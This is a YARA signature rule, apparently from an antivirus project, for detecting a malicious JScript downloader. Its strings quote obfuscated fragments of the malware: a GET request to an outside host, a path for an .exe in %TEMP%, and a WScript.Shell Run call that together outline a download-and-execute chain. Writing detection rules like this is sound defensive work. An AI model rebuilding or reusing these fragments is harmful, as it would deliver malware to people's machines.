rule sig_20160328_fe0e21dcc7ef8a0402efd5579579c234 {
  meta:
    description = "datamaliciousorder - file 20160328_fe0e21dcc7ef8a0402efd5579579c234.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3290fe7a7967167def2221dbecb99095be7dfc8018d965940c0edd395e17d7b5"

  strings:
    $s1  = "function Vvypf() {return Jyvoc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"VbUBKcPJi.exe\";};" fullword ascii
    $s2  = "Semsqc[Ktrtgkiaa](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Yjpxgfc](Aceta() * 11)} while (Semsqc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ehjaiu(Ufupyorgr, Wniqs){return Ufupyorgr - Wniqs;};" fullword ascii
    $s5  = "var Jyvoc = function Iesliwuprl() {return WScript[Krfhsal](\"WScript.Shell\");}();" fullword ascii
    $s6  = "return Ehjaiu(Gisbintfj, Szwoxjmdhg);" fullword ascii
    $s7  = "function Qlqvzq() {return ((Xygfbgeo == true) && (Xygfbgeo == Ihgrqeegug)) ? 1 : Ejujj;};" fullword ascii
    $s8  = "function Tufqkfzyo(Gsfqh) {var Sqouc = (1, 2, 3, 4, 5, Gsfqh); return Sqouc;};" fullword ascii
    $s9  = " while (Qucnwzs){" fullword ascii
    $s10 = "function Tjiecbo()" fullword ascii
    $s11 = "var Xygfbgeo = false;" fullword ascii
    $s12 = "Xygfbgeo = true; " fullword ascii
    $s13 = "var Iyvervmda = false;" fullword ascii
    $s14 = "function Wqpsb(){return Krfhsal;};" fullword ascii
    $s15 = "var Pitwuym = new this[\"Date\"]();" fullword ascii
    $s16 = "function Kmfblfeu(){return Zdfexp;};" fullword ascii
    $s17 = "var Ihgrqeegug = false;" fullword ascii
    $s18 = "Ihgrqeegug = true; " fullword ascii
    $s19 = "function Aceta(){return 22;};" fullword ascii
    $s20 = "function Itngcbswvl(Qpbavgfca){Jyvoc[\"Run\"](Qpbavgfca, Ejujj, Ejujj);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}